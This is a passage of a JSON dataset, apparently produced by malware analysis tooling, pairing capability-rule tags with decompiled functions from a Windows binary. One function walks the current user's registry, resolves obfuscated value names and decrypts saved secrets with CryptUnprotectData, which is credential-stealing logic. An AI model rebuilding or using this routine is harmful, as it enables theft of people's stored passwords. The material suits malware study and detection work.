param_1[0x2f];\n            goto code_r0x0041ea13;\n        }\n    }\n    uVar4 = 0xffffffff;\ncode_r0x0041ebf4:\n    param_1[0x13803] = 0;\n    if (param_1[0x17] != 0) {\n        sub.msvcrt.dll_free(param_1[0x17]);\n        param_1[0x17] = 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 1193
    },
    "0041ec81": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0041ec81(int32_t param_1, int32_t param_2, uint32_t param_3)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    \n    if (param_1 == 0) {\ncode_r0x0041ec98:\n        iVar2 = -1;\n    }\n    else {\n        if ((param_2 != 0) && (param_3 != 0)) {\n            puVar1 = param_1 + 0x60;\n            uVar4 = *puVar1;\n            *puVar1 = *puVar1 + param_3;\n            *(param_1 + 100) = *(param_1 + 100) + CARRY4(uVar4, param_3);\n            uVar3 = fcn.004171da(*(param_1 + 0x70), param_2, param_3);\n            *(param_1 + 0x70) = uVar3;\n            if ((*(param_1 + 0x50) & 0xf) != 0) {\n                uVar4 = fcn.0041a5f0(param_1 + 200, param_2, param_3, 0);\n                return -(1 < uVar4);\n            }\n            uVar4 = (**(param_1 + 0x3c))(*(param_1 + 0x44), *(param_1 + 0x78), *(param_1 + 0x7c), param_2, param_3);\n            if (param_3 != uVar4) goto code_r0x0041ec98;\n            puVar1 = param_1 + 0x78;\n            uVar4 = *puVar1;\n            *puVar1 = *puVar1 + param_3;\n            *(param_1 + 0x7c) = *(param_1 + 0x7c) + CARRY4(uVar4, param_3);\n            puVar1 = param_1 + 0x68;\n            uVar4 = *puVar1;\n            *puVar1 = *puVar1 + param_3;\n            *(param_1 + 0x6c) = *(param_1 + 0x6c) + CARRY4(uVar4, param_3);\n        }\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 540
    },
    "00420420": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00420420(int32_t param_1, int32_t param_2, uint32_t param_3)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    uint32_t uVar6;\n    uint8_t *puVar7;\n    int32_t iVar8;\n    uint32_t *puVar9;\n    uint32_t *puVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    bool bVar13;\n    uint8_t uStack68;\n    uint8_t uStack52;\n    uint32_t uStack48;\n    uint32_t uStack44;\n    \n    if (param_3 < 0x10) goto joined_r0x00420643;\n    uVar2 = param_1 + param_3;\n    uVar11 = uVar2 & 3;\n    if (uVar11 == 0) {\n        uVar11 = param_3 >> 2;\n        uVar2 = param_2 + param_3;\n        param_3 = param_3 & 3;\n    }\n    else {\n        uVar6 = uVar2 - uVar11;\n        iVar8 = param_2 + param_3;\n        do {\n            *(uVar2 - 1) = *(uVar2 - 1) ^ *(iVar8 + -1);\n            uVar2 = uVar2 - 1;\n            iVar8 = iVar8 + -1;\n        } while (uVar6 != uVar2);\n        uVar11 = param_3 - uVar11;\n        uVar2 = uVar11 + param_2;\n        param_3 = uVar11 & 3;\n        uVar11 = uVar11 >> 2;\n    }\n    puVar1 = param_1 + param_3;\n    uVar6 = param_2 + param_3;\n    if ((uVar2 & 3) == 0) {\n        if ((uVar11 & 1) != 0) {\n            uVar11 = uVar11 - 1;\n            puVar1[uVar11] = puVar1[uVar11] ^ *(uVar6 + uVar11 * 4);\n        }\n        do {\n            uVar2 = uVar11 - 2;\n            puVar1[uVar11 - 1] = puVar1[uVar11 - 1] ^ *(uVar6 + 4 + uVar2 * 4);\n            puVar1[uVar2] = puVar1[uVar2] ^ *(uVar6 + uVar2 * 4);\n            uVar11 = uVar2;\n        } while (1 < uVar2);\n        goto joined_r0x00420643;\n    }\n    uStack44 = uVar6 & 3;\n    uStack68 = uStack44 * '\\b';\n    uVar2 = uVar6 & 0xfffffffc;\n    puVar7 = uVar2 + uVar11 * 4;\n    uStack52 = uStack44 * -8 + 0x20;\n    uStack48 = puVar7[uStack44 - 1];\n    if (uStack44 != 1) {\n        puVar3 = (uStack44 - 2) + uVar2 + uVar11 * 4;\n        do {\n            uStack48 = uStack48 << 8 | *puVar3;\n            bVar13 = puVar7 != puVar3;\n            puVar3 = puVar3 + -1;\n        } while (bVar13);\n    }\n    uVar4 = uStack48 << (uStack52 & 0x1f);\n    if ((uVar11 & 1) == 0) {\n        uVar11 = uVar11 - 1;\n        uStack48 = *(uVar2 + uVar11 * 4);\n        uVar12 = uStack48 << (uStack52 & 0x1f);\n        puVar1[uVar11] = puVar1[uVar11] ^ (uVar4 | uStack48 >> (uStack68 & 0x1f));\n        if ((uVar11 & 1) == 0) {\n            (*_sym.imp.msvcrt.dll__assert)(0x426a39, \"../nettle-3.5.1/memxor.c\", 0x66);\n        }\n        if (uVar11 != 2) goto code_r0x00420566;\ncode_r0x004206cf:\n        (*_sym.imp.msvcrt.dll__assert)(0x426a3f, \"../nettle-3.5.1/memxor.c\", 0x6f);\n    }\n    else {\ncode_r0x00420566:\n        iVar8 = uVar11 * 4 + -4;\n        puVar5 = puVar1 + (uVar11 - 2);\n        puVar9 = uVar2 + iVar8;\n        do {\n            uVar4 = *puVar9;\n            puVar10 = puVar9 + -2;\n            puVar5[1] = puVar5[1] ^ (uVar4 >> (uStack68 & 0x1f) | uStack48 << (uStack52 & 0x1f));\n            uStack48 = puVar9[-1];\n            *puVar5 = *puVar5 ^ (uVar4 << (uStack52 & 0x1f) | uStack48 >> (uStack68 & 0x1f));\n            puVar5 = puVar5 + -2;\n            puVar9 = puVar10;\n        } while ((uVar2 - 8) + iVar8 + (uVar11 - 3 >> 1) * -8 != puVar10);\n        uVar12 = uStack48 << (uStack52 & 0x1f);\n        if (uVar11 - 3 != (uVar11 - 3 & 0xfffffffe)) goto code_r0x004206cf;\n    }\n    iVar8 = 3 - uStack44;\n    uVar2 = *(uVar6 + iVar8);\n    while (iVar8 != 0) {\n        iVar8 = iVar8 + -1;\n        uVar2 = uVar2 << 8 | *(uVar6 + iVar8);\n    }\n    *puVar1 = *puVar1 ^ (uVar12 | (uVar2 << (uStack68 & 0x1f)) >> (uStack68 & 0x1f));\njoined_r0x00420643:\n    while (param_3 != 0) {\n        param_3 = param_3 - 1;\n        *(param_1 + param_3) = *(param_1 + param_3) ^ *(param_2 + param_3);\n    }\n    return param_1;\n}\n",
        "token_count": 1512
    },
    "00420700": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420700(uint32_t param_1, uint32_t *param_2, int32_t param_3, uint32_t param_4)\n\n{\n    uint8_t uVar1;\n    uint32_t *in_EAX;\n    uint32_t uVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t *puVar8;\n    uint8_t uStack44;\n    uint8_t uStack40;\n    \n    if (param_4 == 0) {\n        (*_sym.imp.msvcrt.dll__assert)(\"n > 0\", \"../nettle-3.5.1/memxor3.c\", 0x4d);\n    }\n    uVar7 = param_1 & 0xfffffffc;\n    uStack44 = param_3 * -8 + 0x20;\n    iVar6 = param_4 * 4;\n    uVar2 = *(uVar7 + iVar6 + param_3 + -1);\n    if (param_3 + -1 != 0) {\n        puVar3 = (uVar7 - 2) + param_3 + iVar6;\n        do {\n            uVar1 = *puVar3;\n            puVar3 = puVar3 + -1;\n            uVar2 = uVar2 << 8 | uVar1;\n        } while ((uVar7 - 1) + iVar6 != puVar3);\n    }\n    uVar5 = uVar2 << (uStack44 & 0x1f);\n    uStack40 = param_3 << 3;\n    if ((param_4 & 1) == 0) {\n        param_4 = param_4 - 1;\n        iVar6 = iVar6 + -4;\n        uVar2 = *(uVar7 + param_4 * 4);\n        in_EAX[param_4] = (uVar5 | uVar2 >> (uStack40 & 0x1f)) ^ param_2[param_4];\n        uVar5 = uVar2 << (uStack44 & 0x1f);\n    }\n    if (2 < param_4) {\n        uVar5 = param_4;\n        puVar8 = (uVar7 - 4) + iVar6;\n        do {\n            uVar7 = *puVar8;\n            uVar4 = uVar5 - 2;\n            in_EAX[uVar5 - 1] = (uVar7 >> (uStack40 & 0x1f) | uVar2 << (uStack44 & 0x1f)) ^ param_2[uVar5 - 1];\n            uVar2 = puVar8[-1];\n            in_EAX[uVar4] = (uVar2 >> (uStack40 & 0x1f) | uVar7 << (uStack44 & 0x1f)) ^ param_2[uVar4];\n            uVar5 = uVar4;\n            puVar8 = puVar8 + -2;\n        } while (2 < uVar4);\n        param_4 = (param_4 - 2) - (param_4 - 3 & 0xfffffffe);\n        uVar5 = uVar2 << (uStack44 & 0x1f);\n    }\n    if (param_4 != 1) {\n        (*_sym.imp.msvcrt.dll__assert)(\"n == 1\", \"../nettle-3.5.1/memxor3.c\", 0x6b);\n    }\n    param_3 = 3 - param_3;\n    uVar2 = *(param_1 + param_3);\n    while (param_3 != 0) {\n        param_3 = param_3 + -1;\n        uVar2 = uVar2 << 8 | *(param_1 + param_3);\n    }\n    *in_EAX = (uVar5 | (uVar2 << (uStack40 & 0x1f)) >> (uStack40 & 0x1f)) ^ *param_2;\n    return;\n}\n",
        "token_count": 914
    },
    "00404081": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t fcn.00404081(int32_t param_1, uint32_t param_2, int32_t param_3)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    if ((param_2 & 3) == 0) {\n        iVar2 = 0;\n        for (uVar4 = 0; uVar4 != param_2; uVar4 = uVar4 + 1) {\n            uVar1 = *(param_1 + uVar4);\n            if (uVar1 == 0x3d) {\n                return iVar2;\n            }\n            if ((0x4f < uVar1 - 0x2b) || (uVar1 = *(uVar1 + 0x422d80),  uVar1 == 0xff)) goto code_r0x004040d7;\n            uVar3 = uVar4 & 3;\n            if (uVar3 == 2) {\n                *(param_3 + 1 + iVar2) = uVar1 << 6;\n                *(param_3 + iVar2) = *(param_3 + iVar2) | uVar1 >> 2 & 0xf;\ncode_r0x00404104:\n                iVar2 = iVar2 + 1;\n            }\n            else {\n                if (uVar3 == 3) {\n                    *(param_3 + iVar2) = *(param_3 + iVar2) | uVar1;\n                    goto code_r0x00404104;\n                }\n                if (uVar3 == 1) {\n                    *(param_3 + 1 + iVar2) = uVar1 << 4;\n                    *(param_3 + iVar2) = *(param_3 + iVar2) | uVar1 >> 4 & 3;\n                    goto code_r0x00404104;\n                }\n                *(param_3 + iVar2) = uVar1 << 2;\n            }\n        }\n    }\n    else {\ncode_r0x004040d7:\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 470
    },
    "0040c4b7": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nuchar * fcn.0040c4b7(uchar *param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uchar *puVar7;\n    uchar *puVar8;\n    uchar *puVar9;\n    uchar *puStack3512;\n    char *pcStack3508;\n    uint uStack3504;\n    uchar *puStack3500;\n    uchar *puStack3496;\n    uchar *puStack3492;\n    uchar *puStack3488;\n    uchar *puStack3484;\n    uchar *puStack3480;\n    uint uStack3476;\n    uchar *puStack3472;\n    uint uStack3468;\n    uchar *puStack3464;\n    uchar *puStack3460;\n    uchar *puStack3456;\n    int32_t iStack3452;\n    uchar *puStack3448;\n    uchar *puStack3444;\n    uint uStack3440;\n    uchar *puStack3436;\n    uint uStack3432;\n    uchar *puStack3428;\n    uchar *puStack3424;\n    int32_t iStack3420;\n    uint uStack3416;\n    uchar auStack3412 [12];\n    uint uStack3400;\n    uchar auStack3396 [8];\n    uint uStack3388;\n    uint uStack3384;\n    uint uStack3380;\n    uint uStack3376;\n    uchar auStack3224 [32];\n    uchar auStack3192 [4];\n    uchar auStack3188 [32];\n    uchar auStack3156 [188];\n    uchar auStack2968 [32];\n    uchar auStack2936 [4];\n    uchar auStack2932 [32];\n    uchar auStack2900 [188];\n    uchar auStack2712 [32];\n    char cStack2680;\n    uchar auStack2679 [3];\n    uchar auStack2676 [32];\n    char cStack2644;\n    uchar auStack2643 [495];\n    uchar auStack2148 [32];\n    uchar auStack2116 [4];\n    uchar auStack2112 [32];\n    uchar auStack2080 [956];\n    uchar auStack1124 [36];\n    uchar auStack1088 [1020];\n    uint uStack68;\n    uint uStack32;\n    \n    uStack3440 = 0xf003f;\n    puStack3444 = NULL;\n    iStack3452 = -0x7fffffff;\n    uStack3388 = 0;\n    puStack3448 = param_1;\n    uStack3384 = 0;\n    uStack3376 = 0x400;\n    puStack3456 = 0x40c508;\n    puStack3436 = &stack0xfffff2bc;\n    iVar2 = sub.ADVAPI32.DLL_RegOpenKeyExA();\n    if (iVar2 == 0) {\n        puVar7 = NULL;\n        while( true ) {\n            puStack3444 = &stack0xfffff2cc;\n            puStack3428 = NULL;\n            uStack3432 = 0;\n            puStack3436 = NULL;\n            uStack3440 = 0;\n            puStack3448 = &stack0xfffff7e0;\n            iStack3452 = iStack3420;\n            puStack3456 = uStack3400;\n            puStack3460 = 0x40c564;\n            iVar2 = sub.ADVAPI32.DLL_RegEnumKeyExA();\n            if (iVar2 == 0x103) break;\n            puStack3472 = &stack0xfffff7c0;\n            puStack3480 = 0x4233dd;\n            puStack3484 = 0x400;\n            iStack3452 = iStack3452 + 1;\n            uStack3476 = uStack32;\n            puStack3492 = 0x40c5ab;\n            puStack3488 = &stack0xfffffbc0;\n            fcn.004127a8();\n            puStack3472 = &stack0xfffff29c;\n            uStack3476 = 0xf003f;\n            puStack3480 = NULL;\n            puStack3488 = 0x80000001;\n            puStack3492 = 0x40c5d3;\n            puStack3484 = &stack0xfffffbc0;\n            iVar2 = sub.ADVAPI32.DLL_RegOpenKeyExA();\n            if (iVar2 == 0) {\n                pcStack3508 = \"jlC4i\";\n                puStack3512 = 0x40c5ee;\n                uStack3504 = fcn.004081aa();\n                puStack3500 = &stack0xfffff3ac;\n                puStack3496 = 0x100;\n                pcStack3508 = puStack3448;\n                puStack3512 = 0x40c615;\n                puStack3492 = &stack0xfffff294;\n                cVar1 = fcn.0040c46e();\n                if (cVar1 != '\\0') {\n                    pcStack3508 = \"9T9N u6d0\";\n                    puStack3512 = 0x40c62d;\n                    uStack3504 = fcn.004081aa();\n                    puStack3496 = 0x100;\n                    pcStack3508 = puStack3448;\n                    puStack3512 = 0x40c64d;\n                    puStack3500 = &stack0xfffff2ac;\n                    puStack3492 = &stack0xfffff294;\n                    cVar1 = fcn.0040c46e();\n                    if (cVar1 == '\\0') {\n                        pcStack3508 = \"XFD9 u6d0\";\n                        puStack3512 = 0x40c6cd;\n                        uStack3504 = fcn.004081aa();\n                        puStack3496 = 0x100;\n                        pcStack3508 = puStack3448;\n                        puStack3512 = 0x40c6ed;\n                        puStack3500 = &stack0xfffff2ac;\n                        puStack3492 = &stack0xfffff294;\n                        cVar1 = fcn.0040c46e();\n                        if (cVar1 == '\\0') {\n                            pcStack3508 = \"-qq9 u6d0\";\n                            puStack3512 = 0x40c76d;\n                            uStack3504 = fcn.004081aa();\n                            puStack3496 = 0x100;\n                            pcStack3508 = puStack3448;\n                            puStack3512 = 0x40c78d;\n                            puStack3500 = &stack0xfffff2ac;\n                            puStack3492 = &stack0xfffff294;\n                            cVar1 = fcn.0040c46e();\n                            if (cVar1 == '\\0') {\n                                pcStack3508 = \"MFq9 u6d0\";\n                                puStack3512 = 0x40c80d;\n                                uStack3504 = fcn.004081aa();\n                                puStack3496 = 0x100;\n                                pcStack3508 = puStack3448;\n                                puStack3512 = 0x40c82d;\n                                puStack3500 = &stack0xfffff2ac;\n                                puStack3492 = &stack0xfffff294;\n                                cVar1 = fcn.0040c46e();\n                                if (cVar1 == '\\0') {\n                                    pcStack3508 = \"jDM u6d0\";\n                                    puStack3512 = 0x40c8ad;\n                                    uStack3504 = fcn.004081aa();\n                                    puStack3496 = 0x100;\n                                    pcStack3508 = puStack3448;\n                                    puStack3512 = 0x40c8cd;\n                                    puStack3500 = &stack0xfffff2ac;\n                                    puStack3492 = &stack0xfffff294;\n                                    cVar1 = fcn.0040c46e();\n                                    if (cVar1 == '\\0') goto code_r0x0040c9dc;\n                                    pcStack3508 = \"jDM Md02d0 urm\";\n                                    puStack3512 = 0x40c8e1;\n                                    uStack3504 = fcn.004081aa();\n                                    puStack3500 = &stack0xfffff4ac;\n                                    puStack3496 = 0x100;\n                                    pcStack3508 = puStack3448;\n                                    puStack3512 = 0x40c908;\n                                    puStack3492 = &stack0xfffff294;\n                                    fcn.0040c46e();\n                                    pcStack3508 = \"jDM 9C66gW0S\";\n                                    puStack3512 = 0x40c914;\n                                    uStack3504 = fcn.004081aa();\n                                    puStack3500 = &stack0xfffff5ac;\n                                    puStack3496 = 0x200;\n                                    uVar5 = 5;\n                                    pcStack3508 = puStack3448;\n                                    puStack3512 = 0x40c940;\n                                    puStack3492 = &stack0xfffff294;\n                                    cVar1 = fcn.0040c46e();\n                                }\n                                else {\n                                    pcStack3508 = \"MFq9 Md02d0\";\n                                    puStack3512 = 0x40c83d;\n                                    uStack3504 = fcn.004081aa();\n                                    puStack3500 = &stack0xfffff4ac;\n                                    puStack3496 = 0x100;\n                                    pcStack3508 = puStack3448;\n                                    puStack3512 = 0x40c864;\n                                    puStack3492 = &stack0xfffff294;\n                                    fcn.0040c46e();\n                                    pcStack3508 = \"MFq9 9C66gW0S\";\n                                    puStack3512 = 0x40c870;\n                                    uStack3504 = fcn.004081aa();\n                                    puStack3500 = &stack0xfffff5ac;\n                                    puStack3496 = 0x200;\n                                    uVar5 = 4;\n                                    pcStack3508 = puStack3448;\n                                    puStack3512 = 0x40c89c;\n                                    puStack3492 = &stack0xfffff294;\n                                    cVar1 = fcn.0040c46e();\n                                }\n                            }\n                            else {\n                                pcStack3508 = \"-qq9 Md02d0\";\n                                puStack3512 = 0x40c79d;\n                                uStack3504 = fcn.004081aa();\n                                puStack3500 = &stack0xfffff4ac;\n                                puStack3496 = 0x100;\n                                pcStack3508 = puStack3448;\n                                puStack3512 = 0x40c7c4;\n                                puStack3492 = &stack0xfffff294;\n                                fcn.0040c46e();\n                                pcStack3508 = \"-qq9 9C66gW0S\";\n                                puStack3512 = 0x40c7d0;\n                                uStack3504 = fcn.004081aa();\n                                puStack3500 = &stack0xfffff5ac;\n                                puStack3496 = 0x200;\n                                uVar5 = 3;\n                                pcStack3508 = puStack3448;\n                                puStack3512 = 0x40c7fc;\n                                puStack3492 = &stack0xfffff294;\n                                cVar1 = fcn.0040c46e();\n                            }\n                        }\n                        else {\n                            pcStack3508 = \"XFD9 Md02d0\";\n                            puStack3512 = 0x40c6fd;\n                            uStack3504 = fcn.004081aa();\n                            puStack3500 = &stack0xfffff4ac;\n                            puStack3496 = 0x100;\n                            pcStack3508 = puStack3448;\n                            puStack3512 = 0x40c724;\n                            puStack3492 = &stack0xfffff294;\n                            fcn.0040c46e();\n                            pcStack3508 = \"XFD9 9C66gW0S\";\n                            puStack3512 = 0x40c730;\n                            uStack3504 = fcn.004081aa();\n                            puStack3500 = &stack0xfffff5ac;\n                            puStack3496 = 0x200;\n                            uVar5 = 2;\n                            pcStack3508 = puStack3448;\n                            puStack3512 = 0x40c75c;\n                            puStack3492 = &stack0xfffff294;\n                            cVar1 = fcn.0040c46e();\n                        }\n                    }\n                    else {\n                        pcStack3508 = \"9T9N Md02d0\";\n                        puStack3512 = 0x40c65d;\n                        uStack3504 = fcn.004081aa();\n                        puStack3500 = &stack0xfffff4ac;\n                        puStack3496 = 0x100;\n                        pcStack3508 = puStack3448;\n                        puStack3512 = 0x40c684;\n                        puStack3492 = &stack0xfffff294;\n                        fcn.0040c46e();\n                        pcStack3508 = \"9T9N 9C66gW0S\";\n                        puStack3512 = 0x40c690;\n                        uStack3504 = fcn.004081aa();\n                        puStack3500 = &stack0xfffff5ac;\n                        puStack3496 = 0x200;\n                        uVar5 = 1;\n                        pcStack3508 = puStack3448;\n                        puStack3512 = 0x40c6bc;\n                        puStack3492 = &stack0xfffff294;\n                        cVar1 = fcn.0040c46e();\n                    }\n                    if ((cVar1 != '\\0') && (cStack2644 == '\\x02')) {\n                        puStack3488 = 0x1;\n                        puStack3492 = NULL;\n                        puStack3496 = NULL;\n                        puStack3500 = NULL;\n                        uStack3504 = 0;\n                        puStack3428 = puStack3436 + -1;\n                        puStack3424 = &stack0xfffff5ad;\n                        puStack3484 = &stack0xfffff2a4;\n                        pcStack3508 = &stack0xfffff29c;\n                        puStack3512 = 0x40cf82;\n                        iVar2 = sub.CRYPT32.DLL_CryptUnprotectData();\n                        if (iVar2 != 0) {\n                            fcn.00412aa3(&stack0xfffff5ac, puStack3444, puStack3448);\n                            sub.KERNEL32.dll_LocalFree(puStack3444);\n                        }\n                    }\n                    puStack3512 = &stack0xfffff58c;\n                    puStack3500 = &stack0xfffff38c;\n                    puStack3496 = puStack3512;\n                    pcStack3508 = fcn.00412755(&stack0xfffff26c, \"%c%c%S\\a%S\\a%S\\a%S\\b\\b\\b\\b\", 1, uVar5, \n                                               &stack0xfffff48c, puStack3500, &stack0xfffff2ac);\n                    if (pcStack3508 == 0xffffffff) {\n                        puStack3512 = puStack3496;\n                        iVar2 = fcn.00412755(&stack0xfffff26c, \"%c%c%s\\a%s\\a%s\\a%S\\b\\b\\b\\b\", 1, uVar5, &stack0xfffff48c\n                                             , puStack3500, &stack0xfffff2ac);\n                        if (iVar2 != -1) {\n                            puStack3472 = fcn.00412abf(&stack0xfffff270, puVar7, &stack0xfffff26c, iVar2, 1);\n                            puVar7 = puVar7 + iVar2;\n                        }\n                    }\n                    else {\n                        puStack3472 = fcn.00412abf(&stack0xfffff270, puVar7, &stack0xfffff26c, pcStack3508, 1);\n                        puVar7 = puVar7 + pcStack3508;\n                    }\n                }\ncode_r0x0040c9dc:\n                sub.ADVAPI32.DLL_RegCloseKey(puStack3480);\n            }\n            uStack3380 = 0x400;\n        }\n    }\n    else {\n        puStack3460 = 0x201;\n        puStack3464 = NULL;\n        puStack3472 = 0x80000001;\n        uStack3476 = 0x40ca21;\n        puStack3456 = &stack0xfffff2bc;\n        iVar2 = sub.ADVAPI32.DLL_RegOpenKeyExA();\n        if (iVar2 != 0) {\n            return puStack3424;\n        }\n        puStack3456 = NULL;\n        iVar2 = 0;\n        while( true ) {\n            puStack3480 = &stack0xfffff2a8;\n            puStack3464 = NULL;\n            uStack3468 = 0;\n            puStack3472 = NULL;\n            uStack3476 = 0;\n            puStack3484 = &stack0xfffff7bc;\n            puStack3488 = puStack3456;\n            puStack3492 = puStack3436;\n            puStack3496 = 0x40ca7d;\n            iVar3 = sub.ADVAPI32.DLL_RegEnumKeyExA();\n            if (iVar3 == 0x103) break;\n            pcStack3508 = &stack0xfffff79c;\n            puStack3488 = &stack0xfffffb9c;\n            puStack3512 = uStack68;\n            fcn.004127a8();\n            pcStack3508 = &stack0xfffff278;\n            puStack3512 = 0xf023f;\n            uVar5 = 0;\n            puStack3488 = 0x80000001;\n            iVar3 = sub.ADVAPI32.DLL_RegOpenKeyExA();\n            if (iVar3 == 0) {\n                uVar4 = fcn.004081aa(\"jlC4i\");\n                cVar1 = fcn.0040c46e(puStack3484, uVar4, &stack0xfffff388, 0x100, &stack0xfffff270);\n                if (cVar1 != '\\0') {\n                    uVar4 = fcn.004081aa(\"9T9N u6d0\");\n                    cVar1 = fcn.0040c46e(puStack3484, uVar4, &stack0xfffff288, 0x100, &stack0xfffff270);\n                    if (cVar1 == '\\0') {\n                        uVar4 = fcn.004081aa(\"XFD9 u6d0\");\n                        cVar1 = fcn.0040c46e(puStack3484, uVar4, &stack0xfffff288, 0x100, &stack0xfffff270);\n                        if (cVar1 == '\\0') {\n                            uVar4 = fcn.004081aa(\"-qq9 u6d0\");\n                            cVar1 = fcn.0040c46e(puStack3484, uVar4, &stack0xfffff288, 0x100, &stack0xfffff270);\n                            if (cVar1 == '\\0') {\n                                uVar4 = fcn.004081aa(\"MFq9 u6d0\");\n                                cVar1 = fcn.0040c46e(puStack3484, uVar4, &stack0xfffff288, 0x100, &stack0xfffff270);\n                                if (cVar1 == '\\0') {\n                                    uVar4 = fcn.004081aa(\"jDM u6d0\");\n                                    cVar1 = fcn.0040c46e(puStack3484, uVar4, &stack0xfffff288, 0x100, &stack0xfffff270);\n                                    if (cVar1 == '\\0') goto code_r0x0040cef5;\n                                    uVar4 = fcn.004081aa(\"jDM Md02d0 urm\");\n                                    fcn.0040c46e(puStack3484, uVar4, &stack0xfffff488, 0x100, &stack0xfffff270);\n                                    uVar4 = fcn.004081aa(\"jDM 9C66gW0S\");\n                                    uVar6 = 5;\n                                    puVar7 = puStack3484;\n                                    cVar1 = fcn.0040c46e(puStack3484, uVar4, &stack0xfffff588, 0x200, &stack0xfffff270);\n                                }\n                                else {\n                                    uVar4 = fcn.004081aa(\"MFq9 Md02d0\");\n                                    fcn.0040c46e(puStack3484, uVar4, &stack0xfffff488, 0x100, &stack0xfffff270);\n                                    uVar4 = fcn.004081aa(\"MFq9 9C66gW0S\");\n                                    uVar6 = 4;\n                                    puVar7 = puStack3484;\n                                    cVar1 = fcn.0040c46e(puStack3484, uVar4, &stack0xfffff588, 0x200, &stack0xfffff270);\n                                }\n                            }\n                            else {\n                                uVar4 = fcn.004081aa(\"-qq9 Md02d0\");\n                                fcn.0040c46e(puStack3484, uVar4, &stack0xfffff488, 0x100, &stack0xfffff270);\n                                uVar4 = fcn.004081aa(\"-qq9 9C66gW0S\");\n                                uVar6 = 3;\n                                puVar7 = puStack3484;\n                                cVar1 = fcn.0040c46e(puStack3484, uVar4, &stack0xfffff588, 0x200, &stack0xfffff270);\n                            }\n                        }\n                        else {\n                            uVar4 = fcn.004081aa(\"XFD9 Md02d0\");\n                            fcn.0040c46e(puStack3484, uVar4, &stack0xfffff488, 0x100, &stack0xfffff270);\n                            uVar4 = fcn.004081aa(\"XFD9 9C66gW0S\");\n                            uVar6 = 2;\n                            puVar7 = puStack3484;\n                            cVar1 = fcn.0040c46e(puStack3484, uVar4, &stack0xfffff588, 0x200, &stack0xfffff270);\n                        }\n                    }\n                    else {\n                        uVar4 = fcn.004081aa(\"9T9N Md02d0\");\n                        fcn.0040c46e(puStack3484, uVar4, &stack0xfffff488, 0x100, &stack0xfffff270);\n                        uVar4 = fcn.004081aa(\"9T9N 9C66gW0S\");\n                        uVar6 = 1;\n                        puVar7 = puStack3484;\n                        cVar1 = fcn.0040c46e(puStack3484, uVar4, &stack0xfffff588, 0x200, &stack0xfffff270);\n                    }\n                    if ((cVar1 != '\\0') && (cStack2680 == '\\x02')) {\n                        uVar4 = 0;\n                        puStack3464 = puStack3472 + -1;\n                        puStack3460 = &stack0xfffff589;\n                        puVar7 = &stack0xfffff278;\n                        iVar3 = sub.CRYPT32.DLL_CryptUnprotectData(puVar7, 0, 0, 0, 0, 1, &stack0xfffff280);\n                        if (iVar3 != 0) {\n                            fcn.00412aa3(&stack0xfffff588, puStack3480, puStack3484);\n                            sub.KERNEL32.dll_LocalFree(puStack3480);\n                        }\n                    }\n                    puVar9 = &stack0xfffff568;\n                    puVar8 = &stack0xfffff368;\n                    iVar3 = fcn.00412755(&stack0xfffff248, \"%c%c%S\\a%S\\a%S\\a%S\\b\\b\\b\\b\", 1, uVar6, &stack0xfffff468, \n                                         puVar8, &stack0xfffff288, puVar9, puVar7, uVar4, puVar8, puVar9);\n                    if (iVar3 == -1) {\n                        iVar3 = fcn.00412755(&stack0xfffff248, \"%c%c%s\\a%s\\a%s\\a%S\\b\\b\\b\\b\", 1, uVar6, &stack0xfffff468\n                                             , puVar8, &stack0xfffff288, puVar9, 0xffffffff);\n                        if (iVar3 != -1) {\n                            pcStack3508 = fcn.00412abf(&stack0xfffff24c, iVar2, &stack0xfffff248, iVar3, 1);\n                            iVar2 = iVar2 + iVar3;\n                        }\n                    }\n                    else {\n                        pcStack3508 = fcn.00412abf(&stack0xfffff24c, iVar2, &stack0xfffff248, iVar3, 1);\n                        iVar2 = iVar2 + iVar3;\n                    }\n                }\ncode_r0x0040cef5:\n                sub.ADVAPI32.DLL_RegCloseKey(uVar5);\n            }\n            uStack3416 = 0x400;\n        }\n    }\n    puStack3488 = uStack3432;\n    puStack3492 = 0x40cf1b;\n    sub.ADVAPI32.DLL_RegCloseKey();\n    return puStack3424;\n}\n",
        "token_count": 5693
    },
    "0040fd78": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
